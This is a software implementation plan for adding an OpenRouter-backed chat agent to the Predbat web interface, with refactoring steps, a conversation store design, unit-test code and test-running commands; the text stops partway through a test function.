# Predbat Web Chat Agent Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a Chat tab to the Predbat web interface where an OpenRouter-backed LLM answers questions about the user's own system, using Predbat's existing tools directly as function-calling tools, and can change settings behind a confirmation gate.

**Architecture:** The nine MCP tool implementations are extracted from `web_mcp.py` into a shared `agent_tools.py` that projects them into either MCP or OpenAI function-calling schema. A new `chat` component owns an agentic streaming loop against OpenRouter; a `ConversationStore` persists many conversations through the Storage component; `chat_tools.py` adds five chat-only tools (title, docs search, source search/read, allowlisted fetch); `web_chat.py` serves the tab and streams turns over SSE.

**Tech Stack:** Python 3, aiohttp (client and server), OpenRouter chat-completions API with `stream: true` and function calling, Predbat's Storage component, server-sent events, vanilla browser JS (no external libraries).

**Spec:** `docs/superpowers/specs/2026-08-27-web-chat-agent-design.md`

## Global Constraints

- **Branch base:** `feat/web-chat-agent`, branched from `feat/mcp-log-and-apps-redaction-4768` (PR #4775). The nine-tool surface, `get_apps`' `masked` argument, `is_secret_key` and `DEBUG_EXCLUDE_LIST` only exist there. Do not rebase onto `main` until #4775 merges.
- **Line length:** 256 chars (Black), 250 chars (Flake8).
- **Docstrings:** 100% coverage required by `interrogate` — every module, class, function and method, including tests and nested helpers.
- **Spelling:** British English (`en-gb`) via CSpell. Add unknown words to `.cspell/custom-dictionary-workspace.txt`; the file is auto-sorted on commit, so re-stage after running pre-commit. `docs/superpowers/` is excluded from both cspell and markdownlint.
- **Naming:** `lower_case_with_underscores`.
- **File access:** must go through the Storage component. Never `open()`/`os.remove()` for cached data. The one exception is `chat_tools.py` reading Predbat's own source files, which is a read-only bounded scan of the install directory, not cache data.
- **The web layer is a UI only. The component does the work.** Every component runs in its own thread with its own `asyncio.run()` (`apps/predbat/hass.py:223`). The OpenRouter conversation, the tool calls and all conversation persistence run on **the chat component's own loop**. Web handlers never do that work on the web loop: they start a turn and read state, nothing more. This is what keeps a five-second source scan or a 10MB log read from freezing the web server and stalling the very SSE stream delivering the reply.
- **The cross-thread contract.** Three kinds of call, and using the wrong one is a bug:
  1. **Fire-and-forget work** — `ChatAgent.submit_turn()` is a *synchronous* method the web thread calls. It claims the turn under the lock, then schedules the coroutine with `asyncio.run_coroutine_threadsafe(coro, self.loop)` and returns a turn id immediately. It never waits.
  2. **Work whose result the handler needs** — `await agent.run_on_agent_loop(coro)`, which wraps `run_coroutine_threadsafe` in `asyncio.wrap_future` so the *web* loop awaits while the *component* loop executes. Neither loop blocks. All `ConversationStore` mutations go through this, so storage writes stay single-threaded.
  3. **Pure in-memory reads and flag flips** — `events_since()`, `get_meta()`, `list_conversations()`, `confirm()`. These are guarded by a `threading.Lock` and are called directly from the web thread.
- **Guard shared state with `threading.Lock`, never `asyncio.Lock`/`Event`/`Queue`.** Two threads genuinely touch the conversation index, the event buffer and the pending confirmations; an asyncio primitive is bound to one loop and would silently fail to synchronise across them. Create `aiohttp.ClientSession` per request inside `async with`.
- **Do not use `base.run_in_executor`.** Its `with ThreadPoolExecutor() as pool` exits via `shutdown(wait=True)`, so it blocks the calling loop until the callback finishes and then returns the raw `Future` rather than the result (`apps/predbat/hass.py:203`). Where an executor really is wanted, use `await asyncio.get_running_loop().run_in_executor(None, fn, *args)` as `apps/predbat/db_manager.py:152` does. Storage needs neither — it is `aiofiles` throughout.
- **Tests are not pytest.** Each test is a function taking `my_predbat`, printing diagnostics, and returning `True` on failure. A `run_<name>_tests(my_predbat)` driver aggregates with `failed |= ...` and returns `failed`. Register in `TEST_REGISTRY` in `apps/predbat/unit_test.py` as `("<name>", run_<name>_tests, "<description>", False)`.
- **Running tests:** from `coverage/`, `./run_all --test <name>`. Always redirect output to a file and grep the file afterwards — never pipe straight to grep, or a wrong search means re-running.
- **Every new `.py` file starts with the house header** (copy verbatim from `apps/predbat/web_mcp.py:1-9`):

```python
# -----------------------------------------------------------------------------
# Predbat Home Battery System
# Copyright Trefor Southwell 2026 - All Rights Reserved
# This application maybe used for personal use only and not for commercial use
# -----------------------------------------------------------------------------
# fmt off
# pylint: disable=consider-using-f-string
# pylint: disable=line-too-long
# pylint: disable=attribute-defined-outside-init
```

- **Pre-commit:** `./run_pre_commit` lives in `coverage/`, not the repo root — run it as `cd coverage && ./run_pre_commit`. It must pass before each commit. It only checks git-tracked files, so `git add` a new file *before* running it or it sails through unchecked. It auto-fixes: ruff and black will rewrite files, so re-stage and re-run until it is clean.
- **Never leave an import a task does not use.** Ruff deletes unused imports automatically, so a task cannot "pre-import" names for a later task — the hook will strip them and the later task will fail. Each task adds exactly the imports its own code uses. Likewise, do not hand-format long dict literals: black reformats them, and the plan's single-line forms are illustrative, not normative.

---

## File Structure

| File | Responsibility |
| ---- | -------------- |
| `apps/predbat/agent_tools.py` | **Create.** `PredbatTools` (the nine tool implementations), `TOOL_DEFS`, `mcp_tool_list()`, `openai_tool_list()`, and the argument-parsing helpers moved out of `web_mcp.py`. |
| `apps/predbat/web_mcp.py` | **Modify.** `MCPServerWrapper` becomes `MCPServerWrapper(PredbatTools)` keeping only OAuth and the JSON-RPC envelope; re-exports every moved name. |
| `apps/predbat/chat_store.py` | **Create.** `ConversationStore` — index, message bodies, LRU, persistence with expiry, the deleted flag, pruning, history trimming. |
| `apps/predbat/chat_tools.py` | **Create.** `CHAT_TOOL_DEFS` and the five chat-only tools: docs search, source search and read, allowlisted URL fetch. `set_chat_title`'s handler lives in `chat.py` because it needs the conversation. |
| `apps/predbat/chat.py` | **Create.** `ChatAgent(ComponentBase)` — config, gating, live snapshot, the streaming agentic loop, tool dispatch, the confirmation gate, the event buffer. |
| `apps/predbat/web_chat.py` | **Create.** `WebChat` — the Chat tab page, its routes, and the SSE stream. |
| `apps/predbat/components.py` | **Modify.** Register `chat` in `COMPONENT_LIST`. |
| `apps/predbat/config.py` | **Modify.** Ten `APPS_SCHEMA` keys, two `CONFIG_ITEMS` switches. |
| `apps/predbat/web.py` | **Modify.** Construct `WebChat`, register routes, pass `chat_enabled` to the header. |
| `apps/predbat/web_helper.py` | **Modify.** `chat_enabled` kwarg on `get_header_html()`; conditional Chat nav link. |
| `apps/predbat/tests/test_agent_tools.py` | **Create.** Registry integrity and both schema projections. |
| `apps/predbat/tests/test_chat_store.py` | **Create.** Conversation lifecycle, expiry, deletion, LRU, pruning, trimming. |
| `apps/predbat/tests/test_chat_tools.py` | **Create.** Docs search, source guards, fetch allowlist and address guards. |
| `apps/predbat/tests/test_chat.py` | **Create.** The agent loop against a fake OpenRouter, titles, confirmation gate, switches. |
| `apps/predbat/tests/test_web_chat.py` | **Create.** Route registration, busy/404 semantics, SSE framing, markdown escaping. |
| `apps/predbat/unit_test.py` | **Modify.** Five `TEST_REGISTRY` entries and their imports. |
| `docs/components.md`, `docs/web-interface.md`, `docs/apps-yaml.md` | **Modify.** User documentation. |

---

## Task 1: Extract the shared tool layer

Behaviour-preserving refactor. Nothing about the MCP contract may change — the golden test in Step 1 is what proves it.

**Files:**
- Create: `apps/predbat/agent_tools.py`
- Create: `apps/predbat/tests/test_agent_tools.py`
- Modify: `apps/predbat/web_mcp.py`
- Modify: `apps/predbat/unit_test.py`

**Interfaces:**
- Consumes: nothing (first task).
- Produces:
  - `agent_tools.PredbatTools(base, log_func=None)` with `async execute(name, arguments) -> dict` and the nine `async _execute_<tool>(arguments) -> dict` methods.
  - `agent_tools.TOOL_DEFS: list[dict]` — each `{"name": str, "description": str, "parameters": dict, "writes": bool, "chat_omit_properties": list[str]}`.
  - `agent_tools.mcp_tool_list() -> list[dict]` — `{"name", "description", "inputSchema"}`.
  - `agent_tools.openai_tool_list(defs=TOOL_DEFS) -> list[dict]` — `{"type": "function", "function": {"name", "description", "parameters"}}`.
  - Re-exported from `web_mcp` unchanged: `MCPArgumentError`, `parse_number_argument`, `compile_filter_argument`, `parse_bool_argument`, `json_safe_value`, `summarise_state_value`, `measure_state_value`, `LOG_FILTER_TYPES`, `MCP_LOG_DEFAULT_LINES`, `MCP_LOG_MAX_LINES`, `MCP_STATE_DEFAULT_MAX_BYTES`, `MCP_STATE_MAX_BYTES_LIMIT`, `MCP_STATE_TOTAL_BYTES_LIMIT`, `MCP_STATE_LARGE_COLLECTION`, `MCP_STATE_SAMPLE_ENTRIES`.

- [ ] **Step 1: Capture the current tools/list output as a golden file**

Before touching anything, snapshot what the MCP server publishes today. Run from `apps/predbat/`:

```bash
cd /Users/treforsouthwell/predbat/batpred/apps/predbat
python3 - <<'PY' > tests/mcp_tools_golden.json
import asyncio, json, sys
sys.path.insert(0, ".")
from web_mcp import MCPServerWrapper
class Stub:
    """Minimal stand-in so MCPServerWrapper can be constructed without a real PredBat."""
    prefix = "predbat"
    plan_interval_minutes = 30
    def log(self, msg):
        """Swallow log output."""
mcp = MCPServerWrapper(Stub(), log_func=None)
print(json.dumps(asyncio.run(mcp._handle_tools_list({})), indent=2, sort_keys=True))
PY
grep -c '"name"' tests/mcp_tools_golden.json
```

Expected: the file contains 9 tool entries (`grep -c` reports 9).

- [ ] **Step 2: Write the failing test**

Create `apps/predbat/tests/test_agent_tools.py` with the house header, then:

```python
"""Tests for the shared agent tool layer extracted from the MCP server.

The golden-list test is the contract guard: the MCP tools/list output must be byte-identical
before and after the extraction, or an MCP client's tool set changed without anyone deciding it.
"""

import asyncio
import json
import os

from agent_tools import TOOL_DEFS, PredbatTools, mcp_tool_list, openai_tool_list
from web_mcp import MCPServerWrapper

GOLDEN_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mcp_tools_golden.json")

WRITE_TOOLS = {"set_config", "set_plan_override"}


def test_tool_defs_integrity(my_predbat):
    """Every TOOL_DEFS entry maps to a handler, and the writes flags name exactly the two writers."""
    failed = False
    print("**** Testing TOOL_DEFS integrity ****")
    tools = PredbatTools(my_predbat, log_func=my_predbat.log)

    for entry in TOOL_DEFS:
        for field in ("name", "description", "parameters", "writes"):
            if field not in entry:
                print("ERROR: TOOL_DEFS entry {} is missing '{}'".format(entry.get("name"), field))
                failed = True
        handler = getattr(tools, "_execute_{}".format(entry["name"]), None)
        if handler is None:
            print("ERROR: no handler _execute_{} for TOOL_DEFS entry".format(entry["name"]))
            failed = True

    declared = {entry["name"] for entry in TOOL_DEFS}
    writers = {entry["name"] for entry in TOOL_DEFS if entry["writes"]}
    if writers != WRITE_TOOLS:
        print("ERROR: writes flags are {}, expected {}".format(sorted(writers), sorted(WRITE_TOOLS)))
        failed = True

    for name in dir(tools):
        if name.startswith("_execute_") and name[len("_execute_"):] not in declared:
            print("ERROR: handler {} has no TOOL_DEFS entry".format(name))
            failed = True

    return failed


def test_mcp_tool_list_matches_golden(my_predbat):
    """mcp_tool_list() reproduces the pre-refactor tools/list output exactly."""
    failed = False
    print("**** Testing mcp_tool_list() against the golden file ****")
    with open(GOLDEN_PATH, "r", encoding="utf-8") as handle:
        golden = json.load(handle)

    produced = {"tools": mcp_tool_list()}
    if json.dumps(produced, sort_keys=True) != json.dumps(golden, sort_keys=True):
        print("ERROR: tools/list changed. Produced:\n{}".format(json.dumps(produced, indent=2, sort_keys=True)))
        failed = True

    mcp = MCPServerWrapper(my_predbat, log_func=my_predbat.log)
    live = asyncio.run(mcp._handle_tools_list({}))
    if json.dumps(live, sort_keys=True) != json.dumps(golden, sort_keys=True):
        print("ERROR: MCPServerWrapper._handle_tools_list no longer matches the golden file")
        failed = True

    return failed


def test_openai_tool_list_shape(my_predbat):
    """openai_tool_list() is well-formed function-calling shape and strips chat_omit_properties."""
    failed = False
    print("**** Testing openai_tool_list() shape ****")
    listed = openai_tool_list()

    if len(listed) != len(TOOL_DEFS):
        print("ERROR: openai_tool_list() returned {} entries, expected {}".format(len(listed), len(TOOL_DEFS)))
        failed = True

    for entry in listed:
        if entry.get("type") != "function" or "function" not in entry:
            print("ERROR: malformed OpenAI tool entry: {}".format(entry))
            failed = True
            continue
        function = entry["function"]
        for field in ("name", "description", "parameters"):
            if field not in function:
                print("ERROR: OpenAI tool {} is missing '{}'".format(function.get("name"), field))
                failed = True

    chat_apps = [e["function"] for e in listed if e["function"]["name"] == "get_apps"][0]
    if "masked" in chat_apps["parameters"].get("properties", {}):
        print("ERROR: get_apps still exposes 'masked' in the chat projection - credentials could leave the box")
        failed = True

    mcp_apps = [e for e in mcp_tool_list() if e["name"] == "get_apps"][0]
    if "masked" not in mcp_apps["inputSchema"].get("properties", {}):
        print("ERROR: get_apps lost 'masked' from the MCP projection")
        failed = True

    return failed


def test_execute_dispatch(my_predbat):
    """execute() reaches a real handler and reports an unknown tool rather than raising."""
    failed = False
    print("**** Testing PredbatTools.execute() dispatch ****")
    tools = PredbatTools(my_predbat, log_func=my_predbat.log)

    result = asyncio.run(tools.execute("get_config", {}))
    if not result.get("success"):
        print("ERROR: execute('get_config') failed: {}".format(result.get("error")))
        failed = True

    result = asyncio.run(tools.execute("no_such_tool", {}))
    if result.get("success") or "no_such_tool" not in str(result.get("error")):
        print("ERROR: unknown tool did not report cleanly: {}".format(result))
        failed = True

    return failed


def test_mcp_wrapper_still_inherits(my_predbat):
    """MCPServerWrapper keeps the _execute_* methods its existing tests call directly."""
    failed = False
    print("**** Testing MCPServerWrapper inheritance ****")
    mcp = MCPServerWrapper(my_predbat, log_func=my_predbat.log)
    for name in ("_execute_get_apps", "_execute_get_log", "_execute_get_state", "_execute_get_plan"):
        if not callable(getattr(mcp, name, None)):
            print("ERROR: MCPServerWrapper lost {}".format(name))
            failed = True
    return failed


def run_agent_tools_tests(my_predbat):
    """Run every shared tool layer test, returning True if any of them failed."""
    failed = False
    failed |= test_tool_defs_integrity(my_predbat)
    failed |= test_mcp_tool_list_matches_golden(my_predbat)
    failed |= test_openai_tool_list_shape(my_predbat)
    failed |= test_execute_dispatch(my_predbat)
    failed |= test_mcp_wrapper_still_inherits(my_predbat)
    return failed
```

- [ ] **Step 3: Register the test**

In `apps/predbat/unit_test.py`, add the import beside the other `from tests.` imports (near line 110):

```python
from tests.test_agent_tools import run_agent_tools_tests
```

and add to `TEST_REGISTRY`, immediately before the `("web_mcp", ...)` entry:

```python
        ("agent_tools", run_agent_tools_tests, "Shared agent tool layer and schema projection tests", False),
```

- [ ] **Step 4: Run the test to verify it fails**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test agent_tools > /tmp/agent_tools_1.txt 2>&1; grep -iE "error|traceback|FAIL|PASS" /tmp/agent_tools_1.txt | head -20
```

Expected: FAIL with `ModuleNotFoundError: No module named 'agent_tools'`.

- [ ] **Step 5: Create `agent_tools.py` by moving code out of `web_mcp.py`**

Create `apps/predbat/agent_tools.py` with the house header and this module docstring:

```python
"""Shared tool layer for Predbat's AI surfaces.

Holds one implementation of each Predbat tool, plus the schema each surface needs: MCP publishes
``inputSchema``, the chat agent publishes OpenAI function-calling ``parameters``. Keeping both
projections over one list is what stops the two surfaces drifting apart as tools are added.
"""
```

Then move, **unchanged**, from `web_mcp.py` into `agent_tools.py`:

1. The constants `LOG_FILTER_TYPES`, `MCP_LOG_DEFAULT_LINES`, `MCP_LOG_MAX_LINES`, `MCP_STATE_DEFAULT_MAX_BYTES`, `MCP_STATE_MAX_BYTES_LIMIT`, `MCP_STATE_TOTAL_BYTES_LIMIT`, `MCP_STATE_LARGE_COLLECTION`, `MCP_STATE_SAMPLE_ENTRIES` (currently `web_mcp.py:45-66`).
2. The helpers `json_safe_value`, `summarise_state_value`, `measure_state_value`, `MCPArgumentError`, `parse_number_argument`, `compile_filter_argument`, `parse_bool_argument` (currently `web_mcp.py:70-207`).
3. The nine `_execute_*` coroutines from `MCPServerWrapper` (currently `web_mcp.py:1108-1465`), as methods of the new `PredbatTools` class.

Import what they need: `import json`, `import re`, `from datetime import datetime, timezone, timedelta`, and `from utils import calc_percent_limit, get_override_time_from_string, mask_secret_args, read_predbat_log, classify_log_line, log_line_included, parse_log_timestamp, is_debug_excluded_key`.

Add the class:

```python
class PredbatTools:
    """The Predbat tool implementations, shared by the MCP server and the chat agent.

    Holds no protocol state: a caller supplies the base Predbat instance and gets coroutines that
    return plain result dicts, which each surface then wraps in its own envelope.
    """

    def __init__(self, base, log_func=None):
        """Bind the tools to a running Predbat instance."""
        self.base = base
        self.prefix = base.prefix
        self.log = log_func or print
        self.plan_interval_minutes = base.plan_interval_minutes

    async def execute(self, name, arguments):
        """Run one tool by name and return its result dict.

        An unknown name is a result rather than an exception because the caller is a model that
        can only correct itself if the failure comes back through the same channel as a success.
        """
        handler = getattr(self, "_execute_{}".format(name), None)
        if handler is None or name not in {entry["name"] for entry in TOOL_DEFS}:
            return {"success": False, "error": "Unknown tool: {}".format(name), "data": None}
        try:
            return await handler(arguments or {})
        except MCPArgumentError as error:
            return {"success": False, "error": str(error), "data": None}
        except Exception as error:
            return {"success": False, "error": "Tool execution failed: {}".format(error), "data": None}

    # ... the nine _execute_* coroutines, moved verbatim from MCPServerWrapper ...
```

`set_state_external` is used by `_execute_set_config`; on `PredbatTools` it becomes
`await self.base.ha_interface.set_state_external(entity_id, value)`, which is what
`ComponentBase.set_state_external` does anyway (`apps/predbat/component_base.py:305`).

**One behavioural change while moving `_execute_get_log`:** it calls `read_predbat_log()`
(`apps/predbat/utils.py:162`), which does a synchronous `open().read()` on a file that reaches
10MB before rotation, plus the rotated previous log. Today that only stalls the MCP component's
own thread. The chat agent runs its tools on the *web* loop, where a multi-second synchronous
read freezes the web server and stops the SSE stream mid-token. Offload it:

```python
        loop = asyncio.get_running_loop()
        logdata = await loop.run_in_executor(None, read_predbat_log)
```

Add `import asyncio` to `agent_tools.py`. This benefits the MCP server too, and the existing
`test_web_mcp` get_log tests assert on the returned lines, which are unchanged.

- [ ] **Step 6: Add `TOOL_DEFS` and the two projections**

At the end of `agent_tools.py`, transcribe the nine entries from the current `_handle_tools_list`
(`web_mcp.py:1198-1240`) into `TOOL_DEFS`. Each entry keeps its `name` and `description`
verbatim, renames `inputSchema` to `parameters`, and gains `writes` and `chat_omit_properties`:

```python
TOOL_DEFS = [
    {"name": "get_plan", "description": "Get the current Predbat battery plan data including forecast, costs, and state information", "parameters": {"type": "object", "properties": {}, "required": []}, "writes": False, "chat_omit_properties": []},
    {"name": "get_status", "description": "Get the current Predbat system status and configuration", "parameters": {"type": "object", "properties": {}, "required": []}, "writes": False, "chat_omit_properties": []},
    # get_apps: 'masked' is stripped from the chat projection so a model cannot ask for
    # unmasked credentials and send them to a third-party provider. See spec section 14.1.
    {"name": "get_apps", "description": "...verbatim...", "parameters": {...}, "writes": False, "chat_omit_properties": ["masked"]},
    {"name": "get_state", "description": "...verbatim...", "parameters": {...}, "writes": False, "chat_omit_properties": []},
    {"name": "get_log", "description": "...verbatim...", "parameters": {...}, "writes": False, "chat_omit_properties": []},
    {"name": "get_config", "description": "...verbatim...", "parameters": {...}, "writes": False, "chat_omit_properties": []},
    {"name": "get_entities", "description": "...verbatim...", "parameters": {...}, "writes": False, "chat_omit_properties": []},
    {"name": "set_config", "description": "...verbatim...", "parameters": {...}, "writes": True, "chat_omit_properties": []},
    {"name": "set_plan_override", "description": "...verbatim...", "parameters": {...}, "writes": True, "chat_omit_properties": []},
]


def mcp_tool_list():
    """Project TOOL_DEFS into the MCP tools/list shape."""
    return [{"name": entry["name"], "description": entry["description"], "inputSchema": entry["parameters"]} for entry in TOOL_DEFS]


def openai_tool_list(defs=None):
    """Project a tool definition list into OpenAI function-calling shape.

    Properties named in ``chat_omit_properties`` are dropped, so a schema can offer an argument
    over MCP that the chat agent must not be able to express.
    """
    projected = []
    for entry in defs if defs is not None else TOOL_DEFS:
        parameters = json.loads(json.dumps(entry["parameters"]))
        omit = entry.get("chat_omit_properties") or []
        if omit:
            properties = parameters.get("properties", {})
            for name in omit:
                properties.pop(name, None)
            parameters["required"] = [name for name in parameters.get("required", []) if name not in omit]
        projected.append({"type": "function", "function": {"name": entry["name"], "description": entry["description"], "parameters": parameters}})
    return projected
```

The entries marked `...verbatim...` must be copied **character for character** from
`web_mcp.py:1198-1240`, including the `.format(...)` calls inside two of the descriptions. Do not
paraphrase or reflow them: the golden test written in Step 2 compares the whole projected list
against the pre-refactor output, so any transcription drift — a changed word, a lost format
argument — fails Step 8 with a diff showing exactly what moved.

The `json.loads(json.dumps(...))` is a deep copy so the projection never mutates `TOOL_DEFS` — without it, the first chat request would permanently delete `masked` from the MCP schema too.

- [ ] **Step 7: Refactor `web_mcp.py` to inherit**

In `web_mcp.py`:

1. Delete the moved constants, helpers and `_execute_*` methods.
2. Add near the top: `from agent_tools import PredbatTools, TOOL_DEFS, mcp_tool_list, openai_tool_list, MCPArgumentError, parse_number_argument, compile_filter_argument, parse_bool_argument, json_safe_value, summarise_state_value, measure_state_value, LOG_FILTER_TYPES, MCP_LOG_DEFAULT_LINES, MCP_LOG_MAX_LINES, MCP_STATE_DEFAULT_MAX_BYTES, MCP_STATE_MAX_BYTES_LIMIT, MCP_STATE_TOTAL_BYTES_LIMIT, MCP_STATE_LARGE_COLLECTION, MCP_STATE_SAMPLE_ENTRIES  # noqa: F401` — the `noqa` is required because Flake8 will otherwise flag the re-exports as unused.
3. Change `class MCPServerWrapper:` to `class MCPServerWrapper(PredbatTools):` and replace its `__init__` body with:

```python
    def __init__(self, base, log_func=None):
        """Initialise the MCP server wrapper over the shared tool layer."""
        super().__init__(base, log_func=log_func)
        self.is_running = False
        if log_func:
            log_func("Creating HTTP MCP Server with Predbat integration")
```

4. Replace `_handle_tools_list` with:

```python
    async def _handle_tools_list(self, params):
        """Handle MCP tools/list request"""
        return {"tools": mcp_tool_list()}
```

5. Replace the `if tool_name == ...` ladder in `_handle_tools_call` with:

```python
    async def _handle_tools_call(self, params):
        """Handle MCP tools/call request"""
        result = await self.execute(params.get("name"), params.get("arguments", {}))
        if not result.get("success") and str(result.get("error", "")).startswith("Unknown tool"):
            return {"content": [{"type": "text", "text": json.dumps(result)}], "isError": True}
        return {"content": [{"type": "text", "text": json.dumps(result, indent=2)}]}
```

- [ ] **Step 8: Run both test suites to verify they pass**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --test agent_tools --test web_mcp > /tmp/agent_tools_2.txt 2>&1; grep -iE "error|traceback|failed|Passed|Result" /tmp/agent_tools_2.txt | head -30
```

Expected: both `agent_tools` and `web_mcp` pass. `web_mcp` passing unchanged is the point of the task — it exercises the moved handlers through their old call sites.

- [ ] **Step 9: Run the full suite to catch anything importing the moved names**

```bash
cd /Users/treforsouthwell/predbat/batpred/coverage
./run_all --quick > /tmp/agent_tools_full.txt 2>&1; grep -iE "^Result|failed|ERROR|Traceback" /tmp/agent_tools_full.txt | head -30
```

Expected: no new failures versus the pre-task baseline.

- [ ] **Step 10: Commit**

```bash
cd /Users/treforsouthwell/predbat/batpred
git add apps/predbat/agent_tools.py apps/predbat/web_mcp.py apps/predbat/tests/test_agent_tools.py apps/predbat/tests/mcp_tools_golden.json apps/predbat/unit_test.py
./run_pre_commit
git add -A apps/predbat .cspell
git commit -m "refactor(mcp): extract the tool implementations into agent_tools.py

Moves the nine _execute_* handlers and their helpers out of
MCPServerWrapper into a shared PredbatTools class, with TOOL_DEFS
projected into either MCP inputSchema or OpenAI function-calling
parameters. MCPServerWrapper now inherits the handlers, so its existing
tests exercise the moved code unchanged, and a golden copy of tools/list
guards the contract.

Groundwork for the web chat agent, which needs the same tools in the
other schema dialect without speaking MCP."
```

---

## Task 2: The conversation store

**Files:**
- Create: `apps/predbat/chat_store.py`
- Create: `apps/predbat/tests/test_chat_store.py`
- Modify: `apps/predbat/unit_test.py`

**Interfaces:**
- Consumes: `StorageComponent.save(module, filename, data, format=, expiry=)` and `.load(module, filename)` from `apps/predbat/storage.py`. `load()` returns `None` for a missing *or expired* entry.
- Produces:
  - `chat_store.ConversationStore(storage, log, max_history=40, max_conversations=20, expiry_days=30)`
  - `async load_index()` · `list_conversations() -> list[dict]` · `get_meta(cid) -> dict | None`
  - `async create(model=None) -> str` · `async get_messages(cid) -> list` · `async append(cid, message)`
  - `set_title(cid, title)` · `set_model(cid, model)` · `add_usage(cid, usage)` · `rename(cid, title)`
  - `async delete(cid) -> bool` · `async flush(cid=None)`
  - `chat_store.trim_history(messages, max_history, log=None) -> list`
  - `chat_store.derive_title(text) -> str`
  - Constants `TITLE_MAX_LENGTH = 60`, `NEW_CONVERSATION_TITLE = "New chat"`, `BODY_CACHE_SIZE = 5`, `CONVERSATION_VERSION = 1`

- [ ] **Step 1: Write the failing test**

Create `apps/predbat/tests/test_chat_store.py` with the house header, then:

```python
"""Tests for the chat conversation store.

Covers the lifecycle a user drives - create, title, rename, delete - and the three behaviours
that are easy to get quietly wrong: the rolling expiry, the deleted flag standing in for a
storage delete that does not exist, and history trimming never orphaning a tool message.
"""

import asyncio
from datetime import datetime, timezone

from chat_store import BODY_CACHE_SIZE, NEW_CONVERSATION_TITLE, TITLE_MAX_LENGTH, ConversationStore, derive_title, trim_history


class FakeStorage:
    """An in-memory stand-in for StorageComponent that records expiry and can fake expiry."""

    def __init__(self):
        """Start with an empty store and no recorded calls."""
        self.data = {}
        self.expiry = {}
        self.saves = []
        self.expired = set()

    async def save(self, module, filename, data, format="yaml", expiry=None):
        """Record a save, keeping the payload and the expiry it was given."""
        key = (module, filename)
        self.data[key] = data
        self.expiry[key] = expiry
        self.saves.append(key)
        return True

    async def load(self, module, filename):
        """Return stored data, or None when the entry is missing or marked expired."""
        key = (module, filename)
        if key in self.expired:
            return None
        return self.data.get(key)


def _store(storage, **kwargs):
    """Build a ConversationStore over a fake storage with test-friendly defaults."""
    return ConversationStore(storage, print, **kwargs)


def test_create_and_list(my_predbat):
    """A new conversation gets a hex id, the placeholder title, and appears in the listing."""
    failed = False
    print("**** Testing conversation create and list ****")
    storage = FakeStorage()
    store = _store(storage)
    asyncio.run(store.load_index())

    cid = asyncio.run(store.create())
    if len(cid) != 16 or any(char not in "0123456789abcdef" for char in cid):
        print("ERROR: conversation id {!r} is not 16 hex characters".format(cid))
        failed = True

    listed = store.list_conversations()
    if len(listed) != 1 or listed[0]["id"] != cid:
        print("ERROR: created conversation missing from the listing: {}".format(listed))
        failed = True
    if listed[0]["title"] != NEW_CONVERSATION_TITLE:
        print("ERROR: new conversation title is {!r}, expected {!r}".format(listed[0]["title"], NEW_CONVERSATION_TITLE))
        failed = True

    second = asyncio.run(store.create())
    if second == cid:
        print("ERROR: two conversations were given the same id")
        failed = True

    return failed


def test_expiry_is_rolling(my_predbat):
    """Every save carries an expiry expiry_days ahead, and a later save renews it."""
    failed = False
    print("**** Testing rolling conversation expiry ****")
    storage = FakeStorage()
    store = _store(storage, expiry_days=30)
    asyncio.run(store.load_index())
    cid = asyncio.run(store.create())

    key = ("chat", "conv_{}".format(cid))
    first = storage.expiry.get(key)
    if first is None:
        print("ERROR: conversation body was saved without an expiry")
        failed = True
    else:
        days = (first - datetime.now(timezone.utc)).total_seconds() / 86400.0
        if not 29.5 < days < 30.5:
            print("ERROR: expiry is {:.2f} days ahead, expected about 30".format(days))
            failed = True
        if first.tzinfo is None:
            print("ERROR: expiry is not timezone-aware, which storage requires")
            failed = True

    asyncio.run(store.append(cid, {"role": "user", "content": "hello"}))
    asyncio.run(store.flush(cid))
    renewed = storage.expiry.get(key)
    if renewed is None or renewed <= first:
        print("ERROR: a later save did not renew the expiry ({} -> {})".format(first, renewed))
        failed = True

    if storage.expiry.get(("chat", "index")) is None:
        print("ERROR: the index was saved without an expiry, so it would outlive the bodies")
        failed = True

    return failed


def test_delete_is_a_flag(my_predbat):
    """Deleting hides a conversation, refuses it by id, and stops it being re-saved."""
    failed = False
    print("**** Testing conversation deletion ****")
    storage = FakeStorage()
    store = _store(storage)
    asyncio.run(store.load_index())
    cid = asyncio.run(store.create())
    asyncio.run(store.flush())

    saves_before = len(storage.saves)
    if not asyncio.run(store.delete(cid)):
        print("ERROR: delete() reported failure for a live conversation")
        failed = True

    if store.list_conversations():
        print("ERROR: a deleted conversation is still listed")
        failed = True
    if store.get_meta(cid) is not None:
        print("ERROR: get_meta() still resolves a deleted conversation")
        failed = True

    asyncio.run(store.flush())
    body_saves = [key for key in storage.saves[saves_before:] if key == ("chat", "conv_{}".format(cid))]
    if body_saves:
        print("ERROR: a deleted conversation's body was re-saved, so it would never expire")
        failed = True

    if asyncio.run(store.delete("deadbeefdeadbeef")):
        print("ERROR: delete() reported success for an unknown id")
        failed = True

    return failed


def test_index_self_heals(my_predbat):
    """An index entry whose body has expired is dropped on load rather than left dangling."""
    failed = False
    print("**** Testing index self-heal ****")
    storage = FakeStorage()
    store = _store(storage)
    asyncio.run(store.load_index())
    kept = asyncio.run(store.create())
    gone = asyncio.run(store.create())
    asyncio.run(store.flush())

    storage.expired.add(("chat", "conv_{}".format(gone)))

    reopened = _store(storage)
    asyncio.run(reopened.load_index())
    ids = [entry["id"] for entry in reopened.list_conversations()]
    if gone in ids:
        print("ERROR: expired conversation {} survived the index reload".format(gone))
        failed = True
    if kept not in ids:
        print("ERROR: live conversation {} was dropped by the self-heal".format(kept))
        failed = True

    return failed


def test_unknown_version_discarded(my_predbat):
    """A payload from a future version is discarded rather than half-parsed."""
    failed = False
    print("**** Testing unknown payload version handling ****")
    storage = FakeStorage()
    storage.data[("chat", "index")] = {"version": 99, "conversations": [{"id": "aaaabbbbccccdddd", "title": "from the future"}]}

    store = _store(storage)
    asyncio.run(store.load_index())
    if store.list_conversations():
        print("ERROR: an index with an unknown version was loaded anyway")
        failed = True

    return failed


def test_lru_flushes_before_eviction(my_predbat):
    """Loading past the cache size evicts the oldest body, flushing it first if dirty."""
    failed = False
    print("**** Testing body LRU eviction ****")
    storage = FakeStorage()
    store = _store(storage)
